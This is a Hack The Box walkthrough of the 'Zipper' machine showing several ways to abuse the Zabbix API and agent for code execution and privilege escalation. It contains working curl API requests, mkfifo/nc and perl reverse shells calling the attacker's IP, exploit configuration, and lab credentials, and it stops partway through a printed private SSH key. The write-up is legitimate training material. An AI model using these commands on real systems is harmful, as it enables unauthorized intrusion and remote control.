---
title: HTB: Zipper
url: https://0xdf.gitlab.io/2019/02/23/htb-zipper.html
date: 2019-02-23T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-zipper, hackthebox, nmap, zabbix, api, credentials, path-hijack, docker, ltrace, service-hijack, exploit-db, jq, openssl, php, pivot, ssh, linux, ubuntu, oswe-like
---

![Zipper-cover](https://0xdfimages.gitlab.io/img/zipper-cover.png)

Zipper was a pretty straight-forward box, especially compared to some of the more recent 40 point boxes. The main challenge involved using the API for a product called Zabbix, used to manage and inventory computers in an environment. I’ll show way too many ways to abuse Zabbix to get a shell. Then for privesc, I’ll show two methods, using a suid binary that makes a call to system without providing a full path, allowing me to change the path and get a root shell, and identifying a writable service file that I can hijack to gain root privilege. In Beyond Root, I’ll dig into the shell from Exploit-DB, figure out how it works, and make a few improvements.

## Box Info

| Name | [Zipper](https://hackthebox.com/machines/zipper)  [Zipper](https://hackthebox.com/machines/zipper) [Play on HackTheBox](https://hackthebox.com/machines/zipper) |
| --- | --- |
| Release Date | [20 Oct 2018](https://twitter.com/hackthebox_eu/status/1053208525374177280) |
| Retire Date | 23 Feb 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Zipper |
| Radar Graph | Radar chart for Zipper |
| First Blood User | 01:57:59[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| First Blood Root | 02:08:18[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [burmat burmat](https://app.hackthebox.com/users/1453) |

## Recon

### nmap

`nmap` shows 3 ports, ssh, http, and the zabbix agent:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.108
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 11:22 EDT
Nmap scan report for 10.10.10.108
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent

Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds

root@kali# nmap -sV -sC -p 22,80,10050 -oA nmap/scripts 10.10.10.108
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-30 11:24 EDT
Nmap scan report for 10.10.10.108
Host is up (0.020s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds

```

Based on the SSH version, this is likely Ubuntu [Bionic (18.04)](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4).

### Zabbix Agent - TCP 10050

I can try to connect to the agent with `nc`, but it won’t talk back to me. This is probably because it’s filtering on it’s Zabbix server’s IP. And since this is TCP and not UDP, there’s not much I can do there.

### Website - TCP 80

#### Site

The site is an Apache2 Ubuntu default page:

![1540913214764](https://0xdfimages.gitlab.io/img/1540913214764.png)

#### gobuster

```

root@kali# gobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html,zip -t 40

=====================================================                                        
Gobuster v2.0.0              OJ Reeves (@TheColonial)                          
=====================================================                         
[+] Mode         : dir                                                                 
[+] Url/Domain   : http://10.10.10.108/                                       
[+] Threads      : 40                                                             
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403                                          
[+] Extensions   : txt,php,html,zip                                           
[+] Timeout      : 10s
=====================================================
2018/10/30 11:27:18 Starting gobuster
=====================================================                               
/index.html (Status: 200)
/zabbix (Status: 301)                                                         
=====================================================                          
2018/10/30 11:32:44 Finished                                                    
=====================================================

```

There’s the term Zabbix again. Time to dig in on it.

### Zabbix

#### Background

[Zabbix](https://www.zabbix.com/) is a software suite designed to give IT staff visibility over their IT infrastructure through a web GUI and an API. Their pages boasts:

> Monitor anything - Solutions for any kind of IT infrastructure, services, applications, resources

#### Guest Access

The page gives a login, or guest access:

![1540925608243](https://0xdfimages.gitlab.io/img/1540925608243.png)

Since I don’t have any creds at this point, I’ll log in as guest, which takes me to a dashboard:

![1540925638872](https://0xdfimages.gitlab.io/img/1540925638872.png)

Clicking around on the various reports, I found a bunch of things that might indicate usernames / passwords. Under “Latest Data”, there’s a reference to “Zapper’s Backup Script”:

![1540925700177](https://0xdfimages.gitlab.io/img/1540925700177.png)

There’s also reference to two hosts, Zipper and Zabbix.

#### Auth as Zapper

Based on seeing “Zapper’s Backup Script”, I’ll guess there’s a user named zapper. If I log out, and try to log back in as “zapper” with password “zapper”, instead of saying the passwords bad, it says “GUI access disabled”:

![1540926533858](https://0xdfimages.gitlab.io/img/1540926533858.png)

So that’s a good sign that I successfully guessed zapper’s password.

#### API Overview

I wasn’t able to log into the GUI as zapper, but Zabbix also has an API, which is documented [here](https://www.zabbix.com/documentation/3.0/manual/api/reference). To interact with the api, I’ll send `curl` POST requests to `/zabbix/api_jsonrpc.php`.

I’ll first need to login:

```

root@kali# curl http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.login", "id":1, "auth":null, "params":{"user": "zapper", "password": "zapper"}}'
{"jsonrpc":"2.0","result":"c0bd1d0c0837b838999a7d1898027da7","id":1}

```

I get back an auth result that I can use in subsequent queries to show I’m authenticated. I’ll pipe the data into `jq` to pretty print it.

For example, I can list users and see there are three, admin, guest, and zapper:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.get", "id":1, "auth":"f881daebc75db93ad8b7e6f8160f7d41", "params":{"output": "extend"}}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "userid": "1",
      "alias": "Admin",
      "name": "Zabbix",
      "surname": "Administrator",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "en_GB",
      "refresh": "30",
      "type": "3",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50"
    },
    {
      "userid": "2",
      "alias": "guest",
      "name": "",
      "surname": "",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "en_GB",
      "refresh": "30",
      "type": "1",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50"
    },
    {
      "userid": "3",
      "alias": "zapper",
      "name": "zapper",
      "surname": "",
      "url": "",
      "autologin": "0",
      "autologout": "0",
      "lang": "en_GB",
      "refresh": "30",
      "type": "3",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50"
    }
  ],
  "id": 1
}

```

I can also list the hosts, and see there’s two, named Zabbix and Zipper:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"host.get", "id":1, "auth":"f881daebc75db93ad8b7e6f8160f7d41", "params":{}}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "hostid": "10105",
      "proxy_hostid": "0",
      "host": "Zabbix",
      "status": "0",
      "disable_until": "0",
      "error": "",
      "available": "0",
      "errors_from": "0",
      "lastaccess": "0",
      "ipmi_authtype": "-1",
      "ipmi_privilege": "2",
      "ipmi_username": "",
      "ipmi_password": "",
      "ipmi_disable_until": "0",
      "ipmi_available": "0",
      "snmp_disable_until": "0",
      "snmp_available": "0",
      "maintenanceid": "0",
      "maintenance_status": "0",
      "maintenance_type": "0",
      "maintenance_from": "0",
      "ipmi_errors_from": "0",
      "snmp_errors_from": "0",
      "ipmi_error": "",
      "snmp_error": "",
      "jmx_disable_until": "0",
      "jmx_available": "0",
      "jmx_errors_from": "0",
      "jmx_error": "",
      "name": "Zabbix",
      "flags": "0",
      "templateid": "0",
      "description": "This host - Zabbix Server",
      "tls_connect": "1",
      "tls_accept": "1",
      "tls_issuer": "",
      "tls_subject": "",
      "tls_psk_identity": "",
      "tls_psk": ""
    },
    {
      "hostid": "10106",
      "proxy_hostid": "0",
      "host": "Zipper",
      "status": "0",
      "disable_until": "0",
      "error": "",
      "available": "1",
      "errors_from": "0",
      "lastaccess": "0",
      "ipmi_authtype": "-1",
      "ipmi_privilege": "2",
      "ipmi_username": "",
      "ipmi_password": "",
      "ipmi_disable_until": "0",
      "ipmi_available": "0",
      "snmp_disable_until": "0",
      "snmp_available": "0",
      "maintenanceid": "0",
      "maintenance_status": "0",
      "maintenance_type": "0",
      "maintenance_from": "0",
      "ipmi_errors_from": "0",
      "snmp_errors_from": "0",
      "ipmi_error": "",
      "snmp_error": "",
      "jmx_disable_until": "0",
      "jmx_available": "0",
      "jmx_errors_from": "0",
      "jmx_error": "",
      "name": "Zipper",
      "flags": "0",
      "templateid": "0",
      "description": "Zipper",
      "tls_connect": "1",
      "tls_accept": "1",
      "tls_issuer": "",
      "tls_subject": "",
      "tls_psk_identity": "",
      "tls_psk": ""
    }
  ],
  "id": 1
}

```

## Shell as zabbix on Zipper

There are at least four paths to shell access now that I have creds for zapper. Here’s a diagram that shows the various steps:

![1540933566089](https://0xdfimages.gitlab.io/img/1540933566089.png)

I’ll walk the four ways I found, and also go in depth on the [script on Exploit-DB](https://www.exploit-db.com/exploits/39937/) in Beyond Root.

### Path 1 - API Script Execution

#### Overview

The simplest path is to use the API to execute commands on the zipper host. I’ll walk through how to get RCE through the API curl to best show how it works.

#### Get Shell

In the [API section above](#api-overview), I listed the hosts that this instance of Zabbix is controlling. One was called Zabbix, and the other Zipper. If I assume that I’m supposed to target Zipper (since it’s the HTB name for this challenge), I’ll grab the hostid of 10106.

I’ll get a list of the scripts currently set:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.get", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{}}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "scriptid": "1",
      "name": "Ping",
      "command": "/bin/ping -c 3 {HOST.CONN} 2>&1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "2",
      "name": "Traceroute",
      "command": "/usr/bin/traceroute {HOST.CONN} 2>&1",
      "host_access": "2",
      "usrgrpid": "0",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    },
    {
      "scriptid": "3",
      "name": "Detect operating system",
      "command": "sudo /usr/bin/nmap -O {HOST.CONN} 2>&1",
      "host_access": "2",
      "usrgrpid": "7",
      "groupid": "0",
      "description": "",
      "confirmation": "",
      "type": "0",
      "execute_on": "1"
    }
  ],
  "id": 1
}

```

Now I’ll create a script to do what I want, with [script.create](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/create). I’ll start with a simple `whoami`. I’ll need to give the api three parameters:
- `"command": "whoami"` - the command to run
- `"name": "test"` - can be anything
- `"execute_on": 0` - where to run the script. If I don’t specify this, the default is 1, which means it will run on the Zabbix server. But I want to run it at the Zabbix agent, so I’ll pass 0. A lot of people (myself included) got stuck in the Zabbix container because this is an optional parameter, and if you don’t know to set it, you’ll not understand why it’s not putting you where you want to be.

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.create", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"command": "whoami", "name": "test", "execute_on": 0}}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "4"
    ]
  },
  "id": 1
}

```

I get back the scriptid of 4. Now I’ll run that with [script.execute](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/execute):

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"hostid": 10106, "scriptid": 4}}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "response": "success",
    "value": "zabbix"
  },
  "id": 1
}

```

I can see the command ran, and the value that came back was `zabbix`. Nice. I’ll update my script to do something more interesting using the [script.update](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/update) api:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"scriptid": 4, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f"}}' | jq -c .
{"jsonrpc": "2.0","result": {"scriptids": [4]},"id": 1}

```

With a listener running (`nc -lnvp 443`), I’ll hit the script.execute api again. This time it just hangs (and eventually times out):

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"hostid": 10106, "scriptid": 4}}' | jq -c .
{"jsonrpc": "2.0","error": {"code": -32500,"message": "Application error.","data": "Connection timeout of 60 seconds exceeded when connecting to Zabbix server \"localhost\"."},"id": 1}

```

But in my other window, I have a shell:

```

root@kali# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:42864.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ horoot@kali#

```

But only for a second. It dies very quickly (after I get through the `ho` in `hostname`).

#### Stable Shell

I can get around this by being ready to run a second reverse shell in the window when it comes back. I can do this programmatically using `cat` and pipes. I’ll put a `perl` reverse shell into a file:

```

root@kali# cat perl.shell 
perl -e 'use Socket;$i="10.10.14.14";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

Then I’ll start my listener on 443 with that shell being `cat` into it:

```

root@kali# cat perl.shell | nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

Now I’ll start a normal listener on 445.

So in the first window, I `curl`:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"hostid": "10106", "scriptid": 5}}' | jq -c .
{"jsonrpc": "2.0","error": {"code": -32500,"message": "Application error.","data": "Timeout while executing a shell script."},"id": 1}

```

In the second window the shell connects, and immediately gets the perl reverse shell string:

```

root@kali# cat perl.shell | nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:47448.
/bin/sh: 0: can't access tty; job control turned off
root@kali#

```

Now the third window has stable shell:

```

root@kali# nc -lvnp 445
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:35842.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ hostname
zipper

```

### Path 2 - Zabbix to Zabbix Agent

#### RCE on Zabbix

The next two paths start with RCE on the Zabbix host (container). For this one, I’ll show the Exploit-Db script. For the next one, I’ll use the API.

I’ll grab the script:

```

root@kali# wget https://www.exploit-db.com/raw/39937 -O 39937.py
--2019-02-20 14:55:28--  https://www.exploit-db.com/raw/39937
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1712 (1.7K) [text/plain]
Saving to: ‘39937’

39937                                                  100%[============================================================================================================================>]   1.67K  --.-KB/s    in 0.001s  

2019-02-20 14:55:28 (1.36 MB/s) - ‘39937.py’ saved [1712/1712]

```

Now I need to update some stuff at the top:

```

ZABIX_ROOT = 'http://10.10.10.108/zabbix'       ### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'   ### Don't edit

login = 'zapper'                ### Zabbix login
password = 'zapper'     ### Zabbix password
hostid = '10106'        ### Zabbix hostid

```

Now I run it, and have RCE in the Zabbix container:

```

root@kali# python 39937.py 
[zabbix_cmd]>>:  hostname
91cae047f48a

[zabbix_cmd]>>:  id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)

```

#### RCE on Zipper

Now I can use the Zabbix agent on Zipper to get RCE. I mentioned in Recon that I could try to talk to this port directly from Kali, but nothing comes back:

```

root@kali# echo "system.run[hostname | nc 10.10.14.14 443]" | nc 10.10.10.108 10050
root@kali# 

```

That’s because the agent is filtering out input that comes from anything but the Zabbix host. But with RCE on the Zabbix host, I can send commands. The output isn’t sent back, but I can pipe it into nc and send it back to my host:

```

[zabbix_cmd]>>:  echo "system.run[hostname | nc 10.10.14.14 443]" | nc 10.10.10.108 10050
ZBXD8

```

```

root@kali# nc -lnp 443
zipper

```

I can pivot that RCE into a shell:

```

[zabbix_cmd]>>:  echo "system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f]" | nc 10.10.10.108 10050
ZBXD8

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:38512.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)

```

It dies quickly, but I can fix that like I did in the previous section.

### Path 3 - Admin Creds on Zabbix to GUI

#### Shell on Zabbix

This time, I’ll get a shell on Zabbix by changing the `execute_on` parameter to 1 in the script I was using to get a shell in the first path:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.update", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"scriptid": 4, "execute_on": 1}}' | jq -c .
{"jsonrpc": "2.0","result": {"scriptids": [4]},"id": 1}

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"script.execute", "id":1, "auth":"783e0eea06fa7073bf1e63082087c751", "params":{"hostid": "10106", "scriptid": 4}}' | jq . 

```

I get a shell, in the Zabbix container (this one is stable on its own):

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:36370.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)
$ hostname
8e6232f363e0

```

#### Container Enumeration

Looking around this container, there isn’t much to be found. The `/home` directory is empty. Web root just has the default Ubuntu page.

If I go check out the Zabbix config, I’ll find something interesting (using two `greps`, the first to remove lines starting with `#`, and the second to remove empty lines:

```

$ cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
DebugLevel=0
PidFile=/var/run/zabbix/zabbix_server.pid
DBName=zabbixdb
DBUser=zabbix
DBPassword=f.YMeMd$pTbpY3-449
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000

```

About half way down, there’s a DB password.

#### Admin GUI Access

It turns out that is the same password the admin account uses for the web GUI access. Logging in, I now have access to see and modify scripts under Administration/Scripts:

![1550615230474](https://0xdfimages.gitlab.io/img/1550615230474.png)

If I click on my script, I can modify it:

![1550615259766](https://0xdfimages.gitlab.io/img/1550615259766.png)

I’ll notice the “Execute on” option, which is currently on the server. I’ll change that to the agent. I’ll also change the name to 0xdf for good measure.

Now under Monitoring/Latest Data, I’ll update the filters so that I can see the hosts:

![1550622162802](https://0xdfimages.gitlab.io/img/1550622162802.png)

If I click on one of the hosts (Zipper, since that’s the one I want to target), I can see a list of scripts:

![1550622303610](https://0xdfimages.gitlab.io/img/1550622303610.png)

If I click 0xdf, I get a callback. I’ll need to use the two shell solution again, just like above.

### Path 4 - Change Users Via API

Once authenticated (see [API Overview](#api-overview) for details), there are several ways I could use the API to enable GUI admin access:
- Enable GUI access for zapper
- Add guest to admin group
- Create a new user that’s admin

All of these tasks would involve the [user api](https://www.zabbix.com/documentation/3.0/manual/api/reference/user).

#### Enable GUI for Zapper

I can use the [usergroup.get](https://www.zabbix.com/documentation/3.0/manual/api/reference/usergroup/get) api to get a list of the groups that zapper is in:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.get", "id":1, "auth":"a8b49852bf6272f469281dd2c7a3bd91", "params":{"userids": "3"}}' | jq '.'
{
  "jsonrpc": "2.0",
  "result": [
    {
      "usrgrpid": "12",
      "name": "No access to the frontend",
      "gui_access": "2",
      "users_status": "0",
      "debug_mode": "0"
    }
  ],
  "id": 1
}

```

I can see that frontend access is banned, at `"gui_access": "2"`. I’ll change that:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"a8b49852bf6272f469281dd2c7a3bd91", "params":{"usrgrpid": "12", "gui_access": "0"}}' | jq -c '.'
{"jsonrpc": "2.0","result": {"usrgrpids": ["12"]},"id": 1}

```

Now zapper can log into the GUI, and do everything admin could do above. I can set it back once I’m in:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"usergroup.update", "id":1, "auth":"a8b49852bf6272f469281dd2c7a3bd91", "params":{"usrgrpid": "12", "gui_access": "2"}}' | jq -c '.'
{"jsonrpc": "2.0","result": {"usrgrpids": ["12"]},"id": 1}

```

#### Add Admin Rights to Guest

When I log in as guest, I only have a limited menu compared to what I could do as zabbix or admin:

![1550626552078](https://0xdfimages.gitlab.io/img/1550626552078.png)

If I look at the properties of a [user object](https://www.zabbix.com/documentation/3.0/manual/api/reference/user/object), one is type:

![1550626438352](https://0xdfimages.gitlab.io/img/1550626438352.png)

So I’ll use the [user.update](https://www.zabbix.com/documentation/3.0/manual/api/reference/user/update) api to change guest to super admin:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"5e0e2dc84136edbf2a03e1d8c04e95e6", "params":{"userid": "2", "type": "3"}}' | jq -c '.'
{"jsonrpc": "2.0","result": {"userids": ["2"]},"id": 1}

```

Now when I click the link to log in as guest, I’ve got the full site:

![1550626509640](https://0xdfimages.gitlab.io/img/1550626509640.png)

And I can set it back when I’m done:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.update", "id":1, "auth":"5e0e2dc84136edbf2a03e1d8c04e95e6", "params":{"userid": "2", "type": "1"}}' | jq -c '.'
{"jsonrpc":"2.0","result":{"userids":["2"]},"id":1}

```

#### Create New Admin User

If all of that seems like too much work, I can just create my own user with the [user.create](https://www.zabbix.com/documentation/3.0/manual/api/reference/user/create) API. I’ll follow the example in the API docs, giving a passwd, alias, type 3 = super admin, and adding to the admins group 7:

```

root@kali# curl -s http://10.10.10.108/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc":"2.0", "method":"user.create", "id":1, "auth":"5e0e2dc84136edbf2a03e1d8c04e95e6", "params":{"passwd": "fdx0", "usrgrps": [{"usrgrpid": "7"}], "alias": "0xdf", "type": "3"}}' | jq -c '.'
{"jsonrpc":"2.0","result":{"userids":["4"]},"id":1}

```

Now I can log in and have access to admin functions, and can get a shell as shown above:

![1550627004939](https://0xdfimages.gitlab.io/img/1550627004939.png)

#### Conclusion

There’s probably several more ways to use the API to enable GUI access. Another options that occurred to me you could change the password on the admin account. But I’ll leave that as an exercise for the reader.

## Privesc: zabbix –> zapper

With a shall as zabbix on Zipper, I can get into the zapper homedir and see user.txt, but I can’t access it yet:

```

zabbix@zipper:/home/zapper$ ls
user.txt  utils
zabbix@zipper:/home/zapper$ cat user.txt 
cat: user.txt: Permission denied

```

Inside the utils folders, there’s a backup script:

```

zabbix@zipper:/home/zapper/utils$ cat backup.sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
echo $?

```

That script is running every 30 minutes. But I can’t write to the script as zabbix, and I can’t write to the `/home/zapper/utils/` directory to try to take advantage of the wildcard:

```

zabbix@zipper:/home/zapper/utils$ ls -l
total 12
-rwxr-xr-x 1 zapper zapper  288 Oct 30 20:29 backup.sh
-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service

zabbix@zipper:/home/zapper/utils$ ls -ld 
drwxrwxr-x 2 zapper zapper 4096 Sep  8 13:27 .

```

But, it turns out the password in the script, “ZippityDoDah”, is zapper’s password, so I can just `su`:

```

zabbix@zipper:/home/zapper/utils$ su - zapper
Password: 

              Welcome to:
███████╗██╗██████╗ ██████╗ ███████╗██████╗ 
╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝
 ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████╗██║██║     ██║     ███████╗██║  ██║
╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

[0] Packages Need To Be Updated
[>] Backups:
4.0K    /backups/zapper_backup-2018-10-30.7z
4.0K    /backups/zabbix_scripts_backup-2018-10-30.7z

zapper@zipper:~$ id
uid=1000(zapper) gid=1000(zapper) groups=1000(zapper),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

```

From there, can grab user.txt:

```

zapper@zipper:~$ cat user.txt 
aa29e93f...

```

I can also can grab ssh keys as a save point:

```

zapper@zipper:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
